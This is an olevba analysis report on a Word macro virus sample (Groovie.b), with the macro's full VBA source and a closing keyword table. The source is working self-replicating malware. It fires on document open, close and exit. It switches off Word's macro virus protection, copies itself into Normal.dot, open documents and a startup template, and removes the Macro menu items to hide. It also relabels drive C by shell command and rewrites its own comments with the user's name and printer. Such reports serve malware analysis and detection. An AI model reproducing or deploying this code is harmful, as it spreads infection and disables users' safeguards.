olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-881bf5e1a20b61cb546b9ac7763757deeb111ff5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-881bf5e1a20b61cb546b9ac7763757deeb111ff5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SAJOO.bas 
in file: Virus.MSWord.Groovie.b-881bf5e1a20b61cb546b9ac7763757deeb111ff5 - OLE stream: 'Macros/VBA/SAJOO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I02 As Boolean
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I03 As Boolean
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I04 As Boolean
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I05 As Boolean
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I06 As String
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I07 As Boolean
 ' L15/12/99 2:44:31 PM517LABCOMP517
Public I08 As Boolean
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I09()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If MacroContainer = NormalTemplate Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
        I01 = "normal"
 ' L15/12/99 2:44:31 PM517LABCOMP517
        GoTo checkout
 ' L15/12/99 2:44:31 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' L15/12/99 2:44:31 PM517LABCOMP517
checkout:
 ' L15/12/99 2:44:31 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I10()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' L15/12/99 2:44:31 PM517LABCOMP517
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If ActiveDocument.VBProject.VBComponents(i).Name = "sajoo" Then I04 = True
 ' L15/12/99 2:44:31 PM517LABCOMP517
    Next i
 ' L15/12/99 2:44:31 PM517LABCOMP517
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If NormalTemplate.VBProject.VBComponents(i).Name = "sajoo" Then I03 = True
 ' L15/12/99 2:44:31 PM517LABCOMP517
    Next i
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' L15/12/99 2:44:31 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I11()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
Call I09
 ' L15/12/99 2:44:31 PM517LABCOMP517
Call I10
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I01 = "document" Then Call I12
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I01 = "normal" Then Call I13
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I01 = "orbit" Then Call I14
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' L15/12/99 2:44:31 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I12()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
    Application.VBE.ActiveVBProject.VBComponents("sajoo").Export "c:\sajoo.sys"
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I03 = False And I05 = False Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
        With NormalTemplate.VBProject
 ' L15/12/99 2:44:31 PM517LABCOMP517
        With .VBComponents.Import("c:\sajoo.sys")
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I02 = False Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="sajoo", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If I08 = False Then Documents.Open FileName:=I06
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Shell ("label c: sajoo"), 0
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Windows(1).Close
 ' L15/12/99 2:44:31 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I13()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
Application.ScreenUpdating = False
 ' L15/12/99 2:44:31 PM517LABCOMP517
    Call I17
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I04 = False And I07 = True Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
        With ActiveDocument.VBProject
 ' L15/12/99 2:44:31 PM517LABCOMP517
        With .VBComponents.Import("c:\sajoo.sys")
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
        With Dialogs(wdDialogFileSummaryInfo)
 ' L15/12/99 2:44:31 PM517LABCOMP517
            .Comments = "ALT-F11 says it's sajoo!"
 ' L15/12/99 2:44:31 PM517LABCOMP517
            .Execute
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I02 = False And I07 = True Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="sajoo", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If I08 = False Then Documents.Open FileName:=I06
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' L15/12/99 2:44:31 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
    If I02 = False And I07 = False Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Documents.Add Template:="", NewTemplate:=False
 ' L15/12/99 2:44:31 PM517LABCOMP517
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="sajoo", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' L15/12/99 2:44:31 PM517LABCOMP517
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' L15/12/99 2:44:31 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
Application.ScreenUpdating = True
 ' L15/12/99 2:44:31 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I14()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
Application.ScreenUpdating = False
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If I03 = False And I05 = False Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
            With NormalTemplate.VBProject
 ' L15/12/99 2:44:31 PM517LABCOMP517
            With .VBComponents.Import("c:\sajoo.sys")
 ' L15/12/99 2:44:31 PM517LABCOMP517
            End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
            End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
            NormalTemplate.Save
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
        If I04 = False Then
 ' L15/12/99 2:44:31 PM517LABCOMP517
            With ActiveDocument.VBProject
 ' L15/12/99 2:44:31 PM517LABCOMP517
            With .VBComponents.Import("c:\sajoo.sys")
 ' L15/12/99 2:44:31 PM517LABCOMP517
            End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
            End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
            With Dialogs(wdDialogFileSummaryInfo)
 ' L15/12/99 2:44:31 PM517LABCOMP517
                .Comments = "ALT-F11 says it's sajoo!"
 ' L15/12/99 2:44:31 PM517LABCOMP517
                .Execute
 ' L15/12/99 2:44:31 PM517LABCOMP517
            End With
 ' L15/12/99 2:44:31 PM517LABCOMP517
        End If
 ' L15/12/99 2:44:31 PM517LABCOMP517
Application.ScreenUpdating = True
 ' L15/12/99 2:44:31 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:31 PM517LABCOMP517
Function I15()
 ' L15/12/99 2:44:31 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:31 PM517LABCOMP517
    Options.VirusProtection = False
 ' L15/12/99 2:44:31 PM517LABCOMP517
    Options.SaveNormalPrompt = False
 ' L15/12/99 2:44:32 PM517LABCOMP517
    Options.ConfirmConversions = False
 ' L15/12/99 2:44:32 PM517LABCOMP517
    I06 = ActiveDocument.FullName
 ' L15/12/99 2:44:32 PM517LABCOMP517
    Call I11
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub AutoOpen()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I15
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub AutoClose()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:32 PM517LABCOMP517
I08 = True
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I15
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub AutoExit()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I15
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub FileSaveAs()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I16
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I15
 ' L15/12/99 2:44:32 PM517LABCOMP517
Dialogs(wdDialogFileSaveAs).Show
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub fileclose()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:32 PM517LABCOMP517
I08 = True
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I15
 ' L15/12/99 2:44:32 PM517LABCOMP517
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' L15/12/99 2:44:32 PM517LABCOMP517
ActiveDocument.Close
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub fileprint()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error Resume Next
 ' L15/12/99 2:44:32 PM517LABCOMP517
Call I15
 ' L15/12/99 2:44:32 PM517LABCOMP517
Dialogs(wdDialogFilePrint).Show
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub ViewVBCode()
 ' L15/12/99 2:44:32 PM517LABCOMP517
MsgBox "It's sajoo", vbOKOnly, "•  ALT-F11  • says..."
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub ToolsMacro()
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Sub FileTemplates()
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Sub
 ' L15/12/99 2:44:32 PM517LABCOMP517
Function I17()
 ' L15/12/99 2:44:32 PM517LABCOMP517
On Error GoTo docek
 ' L15/12/99 2:44:32 PM517LABCOMP517
    If ActiveDocument.Name <> "" Then
 ' L15/12/99 2:44:32 PM517LABCOMP517
        I07 = True
 ' L15/12/99 2:44:32 PM517LABCOMP517
    End If
 ' L15/12/99 2:44:32 PM517LABCOMP517
    GoTo over
 ' L15/12/99 2:44:32 PM517LABCOMP517
docek:
 ' L15/12/99 2:44:32 PM517LABCOMP517
    I07 = False
 ' L15/12/99 2:44:32 PM517LABCOMP517
over:
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Function
 ' L15/12/99 2:44:32 PM517LABCOMP517
Function I16()
 ' L15/12/99 2:44:32 PM517LABCOMP517
Randomize
 ' L15/12/99 2:44:32 PM517LABCOMP517
rn = Int(Rnd * 999)
 ' L15/12/99 2:44:32 PM517LABCOMP517
With Application.VBE.ActiveVBProject.VBComponents("sajoo").CodeModule
 ' L15/12/99 2:44:32 PM517LABCOMP517
For x = 2 To 358 Step 2
 ' L15/12/99 2:44:32 PM517LABCOMP517
.DeleteLines x
 ' L15/12/99 2:44:32 PM517LABCOMP517
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' L15/12/99 2:44:32 PM517LABCOMP517
Next x
 ' L15/12/99 2:44:32 PM517LABCOMP517
End With
 ' L15/12/99 2:44:32 PM517LABCOMP517
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
